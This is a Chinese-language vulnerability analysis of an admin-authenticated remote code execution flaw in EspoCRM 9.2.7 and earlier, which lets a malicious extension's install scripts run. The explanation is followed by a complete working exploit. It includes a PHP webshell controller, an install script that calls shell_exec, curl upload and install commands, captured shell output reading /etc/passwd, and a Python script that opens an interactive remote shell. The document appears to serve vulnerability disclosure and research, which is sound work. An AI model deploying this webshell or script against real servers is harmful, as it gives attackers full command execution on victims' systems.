# EspoCRM 9.2.7 管理员远程代码执行漏洞分析

## 注意 这是一个鸡肋漏洞，所以公开了。因为他需要管理员。。。。。

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞名称** | EspoCRM Admin Extension Upload RCE |
| **影响版本** | EspoCRM <= 9.2.7 |
| **漏洞类型** | 远程代码执行 (Remote Code Execution) |
| **风险等级** | 高危 (High) |
| **攻击条件** | 需要管理员权限 |
| **CVSS 评分** | 7.2 (High) |
| **利用难度** | 低 |

## 漏洞描述

EspoCRM 是一款开源的客户关系管理(CRM)系统。在 9.2.7 及之前版本中，具有管理员权限的攻击者可以通过 Extension（扩展）上传功能，上传包含恶意 PHP 代码的扩展包，在安装过程中实现任意代码执行，从而完全控制目标服务器。

---

## 漏洞原理详解

### 1. Extension 功能架构

EspoCRM 提供了 Extension（扩展）功能，允许管理员安装第三方扩展来增强系统功能。Extension 本质上是一个 ZIP 压缩包，包含以下结构：

```
extension.zip
├── manifest.json              # 扩展元数据（名称、版本等）
├── scripts/
│   ├── BeforeInstall.php      # 安装前执行的脚本
│   └── AfterInstall.php       # 安装后执行的脚本
└── files/
    └── custom/                # 安装时复制到系统的文件
        └── Espo/Custom/
            └── Controllers/
                └── *.php      # 自定义控制器
```

### 2. 漏洞触发流程

```
┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  1. 上传 ZIP 包   │ -> │  2. 解压到临时目录 │ -> │  3. 安装扩展      │
│  (Base64编码)     │    │  验证 manifest    │    │  执行PHP脚本     │
└──────────────────┘    └──────────────────┘    └──────────────────┘
                                                         │
                                                         v
┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  6. RCE 完成!    │ <- │  5. 复制文件到系统 │ <- │  4. require脚本  │
│  Webshell 可用   │    │  custom/目录      │    │  BeforeInstall   │
└──────────────────┘    └──────────────────┘    └──────────────────┘
```

### 3. 关键漏洞代码分析

#### 3.1 Extension 上传入口

**文件：** `application/Espo/Controllers/Extension.php`

```php
public function postActionUpload(Request $request): stdClass
{
    // 权限检查：仅管理员可访问
    if ($this->config->get('restrictedMode') && !$this->user->isSuperAdmin()) {
        throw new Forbidden();
    }

    if ($this->config->get('adminUpgradeDisabled')) {
        throw new Forbidden("Disabled with 'adminUpgradeDisabled' parameter.");
    }

    // 接收上传的 ZIP 数据
    $body = $request->getBodyContents();

    $manager = new ExtensionManager($this->getContainer());
    $id = $manager->upload($body);  // 上传并解压

    $manifest = $manager->getManifest();

    return (object) [
        'id' => $id,
        'version' => $manifest['version'],
        'name' => $manifest['name'],
        'description' => $manifest['description'],
    ];
}
```

**问题：** 上传的 ZIP 包内容没有进行安全检查，可以包含任意 PHP 文件。

#### 3.2 上传数据处理

**文件：** `application/Espo/Core/Upgrades/Actions/Base/Upload.php`

```php
public function run(mixed $data): string
{
    $processId = $this->createProcessId();

    // ...

    $packageArchivePath = $this->getPackagePath(true);

    $contents = null;

    if (!empty($data)) {
        // 解析 Data URL 格式: data:application/octet-stream;base64,<BASE64>
        [, $contents] = explode(',', $data);
        $contents = base64_decode($contents);  // Base64 解码
    }

    // 直接将内容写入文件系统
    $res = $this->getFileManager()->putContents($packageArchivePath, $contents);

    $this->unzipArchive();  // 解压 ZIP
    $this->isAcceptable();  // 验证 manifest
    // ...

    return $processId;
}
```

**问题：** 解压后的文件没有进行内容安全检查。

#### 3.3 安装过程执行脚本 (RCE 核心)

**文件：** `application/Espo/Core/Upgrades/Actions/Base/Install.php`

```php
public function run(mixed $data): mixed
{
    // ...
    $this->stepInit($data);
    $this->stepCopyBefore($data);

    // 关键：执行 BeforeInstall.php 脚本
    $this->stepBeforeInstallScript($data);  // <-- RCE 触发点 1

    $this->stepCopy($data);      // 复制文件到系统
    $this->stepRebuild($data);

    // 执行 AfterInstall.php 脚本
    $this->stepAfterInstallScript($data);   // <-- RCE 触发点 2

    $this->stepFinalize($data);
    // ...
}
```

#### 3.4 脚本执行函数 (RCE 根本原因)

**文件：** `application/Espo/Core/Upgrades/Actions/Base.php` (第 384-406 行)

```php
protected function runScript(string $type): void
{
    $beforeInstallScript = $this->getScriptPath($type);

    if (!$beforeInstallScript) {
        return;
    }

    $scriptNames = $this->getParam('scriptNames');
    $scriptName = $scriptNames[$type];

    // ============================================
    // 漏洞核心：直接包含并执行用户上传的 PHP 文件
    // ============================================
    require_once($beforeInstallScript);  // <-- 任意 PHP 代码执行!

    $script = new $scriptName();         // 实例化脚本类

    try {
        assert(method_exists($script, 'run'));

        $script->run($this->getContainer(), $this->scriptParams);  // 执行 run() 方法
    } catch (Throwable $e) {
        $this->throwErrorAndRemovePackage(exception: $e);
    }
}
```

**漏洞根因：** 
- 第 395 行 `require_once($beforeInstallScript)` 直接包含用户上传的 PHP 文件
- 没有对 PHP 文件内容进行任何安全检查
- 攻击者可以在 `BeforeInstall.php` 或 `AfterInstall.php` 中放入任意恶意代码

#### 3.5 文件复制 (持久化)

**文件：** `application/Espo/Core/Upgrades/Actions/Base.php`

```php
protected function copyFiles(?string $type = null, string $dest = ''): bool
{
    $filesPath = $this->getCopyFilesPath($type);

    if ($filesPath) {
        // 将 files/ 目录下的所有文件复制到系统目录
        return $this->copy($filesPath, $dest, true);
    }

    return true;
}
```

**问题：** `files/` 目录下的任何 PHP 文件都会被复制到 `custom/` 目录，包括恶意 Webshell。

---

## 利用步骤

### Step 1: 构造恶意 Extension 包

**manifest.json:**
```json
{
    "name": "Malicious Extension",
    "version": "1.0.0",
    "acceptableVersions": [">=7.0.0"],
    "releaseDate": "2026-01-29",
    "author": "Attacker",
    "description": "RCE Exploit"
}
```

**scripts/BeforeInstall.php (安装时自动执行):**
```php
<?php
class BeforeInstall
{
    public function run($container)
    {
        // 在安装时执行任意命令
        $output = shell_exec('id && whoami && hostname');
        file_put_contents('/tmp/pwned.txt', $output);
    }
}
```

**files/custom/Espo/Custom/Controllers/Shell.php (持久化 Webshell):**
```php
<?php
namespace Espo\Custom\Controllers;

use Espo\Core\Api\Request;

class Shell
{
    public function getActionExec(Request $request)
    {
        $cmd = $request->getQueryParam('c');
        if ($cmd) {
            return ['output' => shell_exec(base64_decode($cmd) . ' 2>&1')];
        }
        return ['status' => 'ready'];
    }
}
```

### Step 2: 上传 Extension

```bash
# 将 ZIP 包进行 Base64 编码，使用 Data URL 格式上传
curl -X POST "http://target/api/v1/Extension/action/upload" \
  -H "Authorization: Basic <admin_base64>" \
  -H "Content-Type: application/json" \
  -d '"data:application/octet-stream;base64,<ZIP_BASE64_CONTENT>"'

# 响应示例:
# {"id":"697b0f2b1e29b1448","version":"1.0.0","name":"Malicious Extension",...}
```

### Step 3: 安装 Extension (触发 RCE)

```bash
curl -X POST "http://target/api/v1/Extension/action/install" \
  -H "Authorization: Basic <admin_base64>" \
  -H "Content-Type: application/json" \
  -d '{"id": "697b0f2b1e29b1448"}'

# 响应: true
# 此时 BeforeInstall.php 中的代码已执行!
```

### Step 4: 使用 Webshell

```bash
# 命令需要 Base64 编码
curl "http://target/api/v1/Shell/action/exec?c=$(echo -n 'id' | base64)" \
  -H "Authorization: Basic <admin_base64>"

# 响应:
# {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

---

## 实际验证结果

### 测试环境
- **目标系统:** EspoCRM 9.2.7
- **操作系统:** Debian GNU/Linux 13 (trixie)
- **Web 服务器:** Nginx + PHP-FPM
- **测试时间:** 2026-01-29

### 验证结果

```
[*] 目标: http://1.1.1.1
[*] 上传Extension...
[+] 上传成功: 697b1b5a52824127f
[*] 安装Extension...
[+] 安装成功!
[+] Webshell: http://1.1.1.1/api/v1/Sh/action/x?c=<base64_cmd>

shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell> uname -a
Linux 131b8ca2974c 6.8.0-90-generic #91-Ubuntu SMP ... x86_64 GNU/Linux

shell> cat /etc/passwd | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

---


## POC 工具

### Python 利用脚本

```python
#!/usr/bin/env python3
import base64, io, json, sys, zipfile, requests

def create_extension():
    manifest = {"name":"Ext","version":"1.0.0","acceptableVersions":[">=7.0.0"],
                "releaseDate":"2026-01-01","author":"x","description":"x"}
    webshell = '''<?php
namespace Espo\\Custom\\Controllers;
use Espo\\Core\\Api\\Request;
class Sh {
    public function getActionX(Request $r) {
        $c = $r->getQueryParam('c');
        return $c ? ['o' => shell_exec(base64_decode($c).' 2>&1')] : ['s' => 1];
    }
}'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('manifest.json', json.dumps(manifest))
        z.writestr('files/custom/Espo/Custom/Controllers/Sh.php', webshell)
    return buf.getvalue()

def exploit(url, user, pwd):
    url, auth, s = url.rstrip('/'), (user, pwd), requests.Session()
    s.verify = False
    
    # 上传
    data = f"data:application/octet-stream;base64,{base64.b64encode(create_extension()).decode()}"
    r = s.post(f"{url}/api/v1/Extension/action/upload", auth=auth,
               headers={"Content-Type":"application/json"}, data=json.dumps(data))
    ext_id = r.json().get('id')
    
    # 安装
    s.post(f"{url}/api/v1/Extension/action/install", auth=auth,
           headers={"Content-Type":"application/json"}, json={"id":ext_id})
    
    # Shell
    shell_url = f"{url}/api/v1/Sh/action/x"
    print(f"[+] Webshell: {shell_url}?c=<base64_cmd>")
    
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() in ['exit','quit']: break
        if cmd:
            r = s.get(shell_url, auth=auth, params={"c":base64.b64encode(cmd.encode()).decode()})
            print(r.json().get('o',''))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <URL> <USER> <PASS>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
```

### 使用方法

```bash
python3 exploit.py http://target admin password
```

---


---

## 免责声明

本文档仅用于安全研究和授权测试目的。未经授权对系统进行渗透测试是违法的。请确保在进行任何安全测试之前获得适当的授权。作者不对任何滥用此信息造成的损害承担责任。
